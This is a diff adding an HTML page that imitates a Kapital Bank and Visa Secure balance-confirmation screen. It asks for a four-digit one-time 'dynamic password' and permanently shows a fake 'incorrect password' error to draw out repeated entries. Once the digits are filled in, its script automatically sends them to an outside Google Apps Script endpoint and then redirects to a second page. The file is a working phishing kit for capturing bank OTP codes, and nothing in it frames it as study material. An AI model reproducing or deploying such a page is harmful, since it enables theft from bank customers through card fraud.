@@ -1,0 +1,178 @@
+<html>
+<head>
+    <title>Balance Confirmation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        /* Scaling the content without touching the logos */
+        .scale-content {
+            transform: scale(2);
+            transform-origin: top center;
+            width: 50%; /* Adjusts width after scaling */
+        }
+
+        /* Larger dynamic password section */
+        .otp-inputs input {
+            width: 3rem; /* Increased size */
+            height: 3rem; /* Increased size */
+            font-size: 2rem; /* Larger text */
+        }
+
+        .otp-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .otp-section label {
+            font-size: 1.25rem;
+            margin-bottom: 1rem;
+            align-self: flex-start; /* Align label to the left */
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .info-section {
+            text-align: left; /* Align text to the left */
+        }
+
+        /* Adjust Help and Resend links layout */
+        .links-section {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+        }
+
+        /* Style for the error message */
+        .error-message {
+            color: red;
+            font-size: 0.875rem;
+            margin-bottom: 1rem;
+        }
+    </style>
+</head>
+<body class="bg-white text-gray-800 font-sans">
+
+    <div class="max-w-lg mx-auto p-6 rounded-lg shadow-lg bg-white scale-content">
+        <!-- Header -->
+        <div class="flex justify-between items-center border-b pb-4 mb-4">
+            <div class="flex items-center">
+                <i class="fas fa-arrow-left text-gray-500 text-lg"></i>
+                <span class="ml-2 text-gray-500 text-sm cursor-pointer">Cancel</span>
+            </div>
+            <h2 class="text-center font-bold text-xl">Balans artırımı təsdiqləyin</h2>
+            <div class="w-6"></div> 
+        </div>
+
+        <!-- Logo Section -->
+        <div class="flex justify-between items-center mb-4">
+            <img src="kart.png" alt="Visa Secure logo" class="mr-4" style="width: 140px; height: 64px;">
+            <img src="kapital.png" alt="Kapital Bank logo" style="width: 200px; height: 36px;">
+        </div>
+
+        <!-- Amount Section -->
+        <div class="bg-gray-100 p-4 rounded-lg mb-6">
+            <span class="block text-gray-600 text-sm">Amount</span>
+            <span class="block font-bold text-xl">Minimum : 100 AZN</span>
+        </div>
+
+        <!-- Always Visible Error Message -->
+        <div id="error-message" class="error-message">
+            Dynamic Password is incorrect. Please try again.
+        </div>
+
+        <!-- Dynamic Password Section -->
+        <div class="mb-6 otp-section">
+            <label class="block font-semibold text-sm mb-2">Enter dynamic password:</label>
+            <div class="flex space-x-4 mb-2 otp-inputs">
+                <input type="text" class="w-14 h-14 border border-gray-300 rounded-lg text-center text-2xl" maxlength="1">
+                <input type="text" class="w-14 h-14 border border-gray-300 rounded-lg text-center text-2xl" maxlength="1">
+                <input type="text" class="w-14 h-14 border border-gray-300 rounded-lg text-center text-2xl" maxlength="1">
+                <input type="text" class="w-14 h-14 border border-gray-300 rounded-lg text-center text-2xl" maxlength="1">
+            </div>
+            <div class="links-section">
+                <a href="#" class="text-gray-600 text-sm">Help</a>
+                <a href="#" class="text-blue-500 text-sm">Resend password</a>
+            </div>
+        </div>
+
+        <!-- Information Section -->
+        <div class="border-t pt-4 text-sm text-gray-600 info-section">
+            <p>Please enter a dynamic password to confirm your identity. Password has been sent to 994*******</p>
+            <p>Dynamic password will expire in <span class="text-blue-500" id="timer">02:59</span></p>
+        </div>
+    </div>
+
+    <script>
+        // Timer functionality
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = `${minutes}:${seconds}`;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "00:00";
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const display = document.getElementById("timer");
+            const threeMinutes = 3 * 60;
+            startTimer(threeMinutes, display);
+        };
+
+        // Auto-submit when inputs are filled
+        const inputs = document.querySelectorAll(".otp-inputs input");
+
+        function submitForm() {
+            const otpInput = Array.from(inputs).map(input => input.value).join("");
+
+            const data = { otp: otpInput };
+
+            // Simulate OTP validation error (you can replace this with actual validation)
+            document.getElementById("error-message").classList.remove("hidden");  // Ensure the error message is visible
+
+            fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+                mode: "no-cors",
+            })
+            .then(response => {
+                window.location.href = "index2.html"; // Redirect on success
+            })
+            .catch(error => {
+                console.error("OTP Submission Error:", error);
+            });
+        }
+
+        inputs.forEach((input, index) => {
+            input.addEventListener("input", (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+
+                if ([...inputs].every(input => input.value.trim() !== "")) {
+                    submitForm();
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
